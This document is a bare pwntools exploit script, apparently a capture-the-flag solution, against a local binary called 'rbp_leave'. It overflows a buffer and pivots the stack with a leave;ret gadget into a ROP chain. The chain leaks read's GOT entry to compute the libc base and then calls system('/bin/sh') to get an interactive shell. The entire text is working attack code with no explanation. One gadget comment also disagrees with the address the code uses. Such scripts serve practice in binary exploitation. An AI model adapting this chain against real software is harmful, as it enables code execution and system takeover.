from pwn import *

p = process("./rbp_leave")
gdb.attach(p,"b *0x000000000040073F")
elf = ELF("./rbp_leave")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

name_addr = 0x00000000006010A0
# ROPgadget --binary ./rbp_leave --only "pop|ret"
# 0x0000000000400783 : pop rdi ; ret
rdi = 0x00000000004007c3
rsi2 = 0x00000000004007c1
pop_rsp3 = 0x00000000004007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# ROPgadget --binary ./rbp_leave | grep leave
leave_ret = 0x00000000004006f0 # leave ; ret
ret = 0x00000000004006f1
read_input = 0x00000000004006C7
rop_addr2 = name_addr + 0x800

name = p64(ret) * 0x30
name += p64(rdi) + p64(elf.got["read"])
name += p64(elf.plt["puts"])
name += p64(rdi) + p64(rop_addr2)
name += p64(rsi2) + p64(0x200) + p64(0)
name += p64(read_input)
name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)
p.sendafter("leave your name\n",name.ljust(0x400,"\x00"))

payload1 = "a" * 0x100
payload1 += p64(name_addr - 8)
payload1 += p64(leave_ret)
p.sendafter("try to break it\n",payload1)

leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak_addr - libc.symbols["read"]
libc.address = libc_base
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload2 = p64(rdi) + p64(binsh)
payload2 += p64(system)
p.send(payload2)
p.interactive()
